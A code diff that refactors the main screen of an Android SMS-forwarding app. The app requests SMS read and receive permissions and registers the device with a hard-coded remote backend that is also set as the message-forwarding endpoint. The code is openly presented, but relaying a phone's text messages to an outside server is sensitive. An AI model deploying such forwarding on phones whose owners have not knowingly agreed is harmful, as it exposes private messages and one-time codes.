@@ -1,14 +1,13 @@
 package com.sms.forwarder;
 
 import android.Manifest;
-import android.content.Context;
+import android.content.Intent;
+import android.content.IntentFilter;
 import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
 import android.os.BatteryManager;
 import android.os.Build;
 import android.os.Bundle;
-import android.provider.Settings;
-import android.telephony.TelephonyManager;
 import android.widget.Button;
 import android.widget.EditText;
 import android.widget.TextView;
@@ -36,8 +35,8 @@ public class MainActivity extends AppCompatActivity {
     private static final String TAG = "MainActivity";
 
     /*
-     * Backend base URL.
-     * User ko UI me ye enter karne ki zarurat nahi.
+     * Backend configuration
+     * User does not need to enter this in the UI.
      */
     private static final String API_BASE_URL =
             "https://smssend-8ek4.onrender.com";
@@ -45,7 +44,10 @@ public class MainActivity extends AppCompatActivity {
     private static final String HEARTBEAT_URL =
             API_BASE_URL + "/api/devices/heartbeat";
 
-    private static final String PREFS = "config";
+    private static final String MESSAGE_URL =
+            API_BASE_URL + "/api/messages";
+
+    private static final String PREFS_NAME = "config";
 
     private static final String KEY_DEVICE_ID = "device_id";
     private static final String KEY_PHONE_NUMBER = "phone_number";
@@ -69,15 +71,20 @@ public class MainActivity extends AppCompatActivity {
                     .readTimeout(20, TimeUnit.SECONDS)
                     .build();
 
+    /*
+     * Android runtime permission launcher.
+     */
     private final ActivityResultLauncher<String[]> permissionLauncher =
             registerForActivityResult(
                     new ActivityResultContracts.RequestMultiplePermissions(),
                     result -> {
+
                         updatePermissionStatus();
 
                         if (hasSmsPermissions()) {
+
                             Toast.makeText(
-                                    this,
+                                    MainActivity.this,
                                     "SMS permissions granted",
                                     Toast.LENGTH_SHORT
                             ).show();
@@ -89,6 +96,7 @@ public class MainActivity extends AppCompatActivity {
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
+
         super.onCreate(savedInstanceState);
 
         setContentView(R.layout.activity_main);
@@ -101,12 +109,19 @@ public class MainActivity extends AppCompatActivity {
 
         updateServiceStatus();
 
+        /*
+         * Register/update the device when the app opens.
+         */
         sendHeartbeat();
     }
 
+    /*
+     * Connect XML views.
+     */
     private void initViews() {
 
-        etPhoneNumber = findViewById(R.id.etPhoneNumber);
+        etPhoneNumber =
+                findViewById(R.id.etPhoneNumber);
 
         tvPermissionStatus =
                 findViewById(R.id.tvPermissionStatus);
@@ -129,73 +144,96 @@ public class MainActivity extends AppCompatActivity {
         btnCheckPermissions =
                 findViewById(R.id.btnCheckPermissions);
 
-        btnSavePhone.setOnClickListener(v ->
-                savePhoneNumber()
+        btnSavePhone.setOnClickListener(
+                v -> savePhoneNumber()
         );
 
-        btnCheckPermissions.setOnClickListener(v ->
-                requestPermissionsIfNeeded()
+        btnCheckPermissions.setOnClickListener(
+                v -> requestPermissionsIfNeeded()
         );
     }
 
     /*
-     * Creates device ID only once.
-     * UUID is stored locally and remains the same
-     * after app restart.
+     * Create a persistent random device ID.
+     *
+     * It is generated only once and then stored locally.
+     * It is NOT displayed in the UI.
      */
     private String getOrCreateDeviceId() {
 
         SharedPreferences prefs =
-                getSharedPreferences(PREFS, MODE_PRIVATE);
+                getSharedPreferences(
+                        PREFS_NAME,
+                        MODE_PRIVATE
+                );
 
-        String existing =
-                prefs.getString(KEY_DEVICE_ID, "");
+        String existingId =
+                prefs.getString(
+                        KEY_DEVICE_ID,
+                        ""
+                );
 
-        if (existing != null && !existing.isEmpty()) {
-            return existing;
+        if (existingId != null
+                && !existingId.isEmpty()) {
+
+            return existingId;
         }
 
-        String deviceId =
+        String newDeviceId =
                 UUID.randomUUID().toString();
 
         prefs.edit()
-                .putString(KEY_DEVICE_ID, deviceId)
+                .putString(
+                        KEY_DEVICE_ID,
+                        newDeviceId
+                )
                 .apply();
 
-        return deviceId;
+        return newDeviceId;
     }
 
+    /*
+     * Initialize automatically managed configuration.
+     */
     private void initializeConfig() {
 
         SharedPreferences prefs =
-                getSharedPreferences(PREFS, MODE_PRIVATE);
+                getSharedPreferences(
+                        PREFS_NAME,
+                        MODE_PRIVATE
+                );
 
         /*
-         * Make sure API URL exists locally so
-         * ForwardService can use the same endpoint.
+         * ForwardService uses this value for SMS forwarding.
          */
         prefs.edit()
-                .putString(KEY_API_URL,
-                        API_BASE_URL + "/api/messages")
+                .putString(
+                        KEY_API_URL,
+                        MESSAGE_URL
+                )
                 .apply();
 
         /*
-         * Create UUID if it doesn't already exist.
+         * Make sure device ID exists.
          */
         getOrCreateDeviceId();
 
         /*
-         * Load previously saved phone number.
+         * Restore saved phone number.
          */
-        String phone =
+        String savedPhone =
                 prefs.getString(
                         KEY_PHONE_NUMBER,
                         ""
                 );
 
-        etPhoneNumber.setText(phone);
+        etPhoneNumber.setText(savedPhone);
     }
 
+    /*
+     * Save phone number locally and immediately
+     * update the backend device record.
+     */
     private void savePhoneNumber() {
 
         String phone =
@@ -227,7 +265,7 @@ public class MainActivity extends AppCompatActivity {
         }
 
         getSharedPreferences(
-                PREFS,
+                PREFS_NAME,
                 MODE_PRIVATE
         )
                 .edit()
@@ -246,21 +284,12 @@ public class MainActivity extends AppCompatActivity {
         sendHeartbeat();
     }
 
+    /*
+     * Request SMS permissions if they are not already granted.
+     */
     private void requestPermissionsIfNeeded() {
 
-        boolean receiveSms =
-                ContextCompat.checkSelfPermission(
-                        this,
-                        Manifest.permission.RECEIVE_SMS
-                ) == PackageManager.PERMISSION_GRANTED;
-
-        boolean readSms =
-                ContextCompat.checkSelfPermission(
-                        this,
-                        Manifest.permission.READ_SMS
-                ) == PackageManager.PERMISSION_GRANTED;
-
-        if (receiveSms && readSms) {
+        if (hasSmsPermissions()) {
 
             updatePermissionStatus();
 
@@ -283,19 +312,29 @@ public class MainActivity extends AppCompatActivity {
         );
     }
 
+    /*
+     * Check required SMS permissions.
+     */
     private boolean hasSmsPermissions() {
 
-        return ContextCompat.checkSelfPermission(
-                this,
-                Manifest.permission.RECEIVE_SMS
-        ) == PackageManager.PERMISSION_GRANTED
-                &&
+        boolean receiveSms =
+                ContextCompat.checkSelfPermission(
+                        this,
+                        Manifest.permission.RECEIVE_SMS
+                ) == PackageManager.PERMISSION_GRANTED;
+
+        boolean readSms =
                 ContextCompat.checkSelfPermission(
                         this,
                         Manifest.permission.READ_SMS
                 ) == PackageManager.PERMISSION_GRANTED;
+
+        return receiveSms && readSms;
     }
 
+    /*
+     * Update permission status in UI.
+     */
     private void updatePermissionStatus() {
 
         if (hasSmsPermissions()) {
@@ -305,7 +344,9 @@ public class MainActivity extends AppCompatActivity {
             );
 
             tvPermissionStatus.setTextColor(
-                    getColor(android.R.color.holo_green_light)
+                    getColor(
+                            android.R.color.holo_green_light
+                    )
             );
 
         } else {
@@ -315,33 +356,40 @@ public class MainActivity extends AppCompatActivity {
             );
 
             tvPermissionStatus.setTextColor(
-                    getColor(android.R.color.holo_orange_light)
+                    getColor(
+                            android.R.color.holo_orange_light
+                    )
             );
         }
     }
 
+    /*
+     * Update service status.
+     *
+     * ForwardService is declared in the application
+     * and is started by SmsReceiver when an SMS arrives.
+     */
     private void updateServiceStatus() {
 
-        /*
-         * The SMS receiver is declared in Manifest and
-         * ForwardService is available.
-         *
-         * Actual forwarding begins when SMS is received.
-         */
         tvServiceStatus.setText(
                 "✓ Forwarding service ready"
         );
 
         tvServiceStatus.setTextColor(
-                getColor(android.R.color.holo_green_light)
+                getColor(
+                        android.R.color.holo_green_light
+                )
         );
     }
 
+    /*
+     * Send device registration / heartbeat to backend.
+     */
     private void sendHeartbeat() {
 
         SharedPreferences prefs =
                 getSharedPreferences(
-                        PREFS,
+                        PREFS_NAME,
                         MODE_PRIVATE
                 );
 
@@ -407,16 +455,14 @@ public class MainActivity extends AppCompatActivity {
 
         } catch (Exception e) {
 
-            runOnUiThread(() ->
-                    setBackendError(
-                            "Failed to prepare device data"
-                    )
+            setBackendError(
+                    "Could not prepare device data"
             );
 
             return;
         }
 
-        RequestBody body =
+        RequestBody requestBody =
                 RequestBody.create(
                         json.toString(),
                         MediaType.parse(
@@ -427,16 +473,25 @@ public class MainActivity extends AppCompatActivity {
         Request request =
                 new Request.Builder()
                         .url(HEARTBEAT_URL)
-                        .post(body)
+                        .post(requestBody)
                         .addHeader(
                                 "Content-Type",
                                 "application/json"
                         )
                         .build();
 
-        tvBackendStatus.setText(
-                "⏳ Connecting to backend..."
-        );
+        runOnUiThread(() -> {
+
+            tvBackendStatus.setText(
+                    "⏳ Connecting to backend..."
+            );
+
+            tvBackendStatus.setTextColor(
+                    getColor(
+                            android.R.color.holo_orange_light
+                    )
+            );
+        });
 
         new Thread(() -> {
 
@@ -474,89 +529,121 @@ public class MainActivity extends AppCompatActivity {
 
                 } else {
 
-                    runOnUiThread(() ->
-                            setBackendError(
-                                    "Backend returned HTTP "
-                                            + response.code()
-                            )
+                    setBackendError(
+                            "Backend returned HTTP "
+                                    + response.code()
                     );
                 }
 
             } catch (IOException e) {
 
-                runOnUiThread(() ->
-                        setBackendError(
-                                "Backend unavailable"
-                        )
+                setBackendError(
+                        "Backend unavailable"
                 );
             }
 
         }).start();
     }
 
+    /*
+     * Display backend/device error.
+     */
     private void setBackendError(String message) {
 
-        tvBackendStatus.setText(
-                "✕ " + message
-        );
+        runOnUiThread(() -> {
 
-        tvBackendStatus.setTextColor(
-                getColor(
-                        android.R.color.holo_red_light
-                );
+            tvBackendStatus.setText(
+                    "✕ " + message
+            );
 
-        tvDeviceStatus.setText(
-                "⚠ Device not registered"
-        );
+            tvBackendStatus.setTextColor(
+                    getColor(
+                            android.R.color.holo_red_light
+                    )
+            );
 
-        tvDeviceStatus.setTextColor(
-                getColor(
-                        android.R.color.holo_orange_light
-                );
+            tvDeviceStatus.setText(
+                    "⚠ Device not registered"
+            );
+
+            tvDeviceStatus.setTextColor(
+                    getColor(
+                            android.R.color.holo_orange_light
+                    )
+            );
+        });
     }
 
+    /*
+     * Get battery percentage.
+     */
     private int getBatteryLevel() {
 
-        BatteryManager batteryManager =
-                (BatteryManager) getSystemService(
-                        BATTERY_SERVICE
+        IntentFilter filter =
+                new IntentFilter(
+                        Intent.ACTION_BATTERY_CHANGED
                 );
 
-        if (batteryManager == null) {
+        Intent batteryStatus =
+                registerReceiver(
+                        null,
+                        filter
+                );
+
+        if (batteryStatus == null) {
             return -1;
         }
 
-        return batteryManager.getIntProperty(
-                BatteryManager.BATTERY_PROPERTY_CAPACITY
-        );
-    }
-
-    private boolean isCharging() {
-
-        BatteryManager batteryManager =
-                (BatteryManager) getSystemService(
-                        BATTERY_SERVICE
+        int level =
+                batteryStatus.getIntExtra(
+                        BatteryManager.EXTRA_LEVEL,
+                        -1
                 );
 
-        if (batteryManager == null) {
+        int scale =
+                batteryStatus.getIntExtra(
+                        BatteryManager.EXTRA_SCALE,
+                        -1
+                );
+
+        if (level < 0 || scale <= 0) {
+            return -1;
+        }
+
+        return (level * 100) / scale;
+    }
+
+    /*
+     * Check whether the device is charging.
+     */
+    private boolean isCharging() {
+
+        IntentFilter filter =
+                new IntentFilter(
+                        Intent.ACTION_BATTERY_CHANGED
+                );
+
+        Intent batteryStatus =
+                registerReceiver(
+                        null,
+                        filter
+                );
+
+        if (batteryStatus == null) {
             return false;
         }
 
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+        int status =
+                batteryStatus.getIntExtra(
+                        BatteryManager.EXTRA_STATUS,
+                        -1
+                );
 
-            int status =
-                    batteryManager.getIntProperty(
-                            BatteryManager.BATTERY_PROPERTY_STATUS
-                    );
-
-            return status ==
-                    BatteryManager.BATTERY_STATUS_CHARGING
-                    ||
-                    status ==
-                            BatteryManager.BATTERY_STATUS_FULL;
-        }
-
-        return false;
+        return status ==
+                BatteryManager.BATTERY_STATUS_CHARGING
+                ||
+                status ==
+                        BatteryManager.BATTERY_STATUS_FULL;
     }
 
     @Override
@@ -565,6 +652,7 @@ public class MainActivity extends AppCompatActivity {
         super.onResume();
 
         updatePermissionStatus();
+
         updateServiceStatus();
     }
 }
